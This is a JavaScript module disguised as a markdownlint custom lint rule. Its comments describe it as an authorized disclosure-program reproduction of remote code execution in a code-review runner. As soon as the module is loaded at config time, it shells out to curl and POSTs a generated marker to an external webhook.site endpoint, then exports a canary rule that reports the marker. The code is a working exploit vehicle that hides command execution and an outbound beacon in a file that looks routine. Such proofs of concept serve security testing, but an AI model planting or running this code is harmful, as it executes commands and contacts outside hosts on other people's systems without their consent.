// F-RUNNERSINKS-02 INDEPENDENT-ACCOUNT REPRODUCTION (authorized CodeRabbit VDP, task 3).
// Vehicle: pure-JSON .markdownlint-cli2.jsonc -> customRules -> require() of this module at
// markdownlint-cli2 config-load time inside the review tool runner. MARKER-ONLY payload: a
// runtime-generated marker (absent from the git tree) is beaconed; no credential is read or used,
// nothing is written, and nothing outside this repository is touched.
const cp = require("child_process");
const crypto = require("crypto");
const MARK = "R3P_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
const OAST = "https://webhook.site/7ae728a3-8e69-467e-92c7-4058642d9056/rs2repro";
try {
  cp.execFileSync(
    "curl",
    ["-s", "-m", "10", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST",
     "-H", "Content-Type: application/json", "--data-binary", "@-", OAST],
    { encoding: "utf8", input: JSON.stringify({ p: "exec", m: MARK, utc: new Date().toISOString(),
        note: "independent-account base RCE reproduction, marker only" }),
      stdio: ["pipe", "pipe", "ignore"] }
  );
} catch (e) {}
module.exports = [
  {
    names: ["R3PReproRule"],
    description: "independent-account reproduction canary rule",
    tags: ["poc"],
    function: function (params, onError) {
      onError({
        lineNumber: 1, column: 1,
        ruleNames: ["R3PReproRule", "R3PReproRule"],
        ruleDescription: "independent-account reproduction canary rule",
        detail: "F-RUNNERSINKS-02 repro marker " + MARK,
      });
    },
  },
];
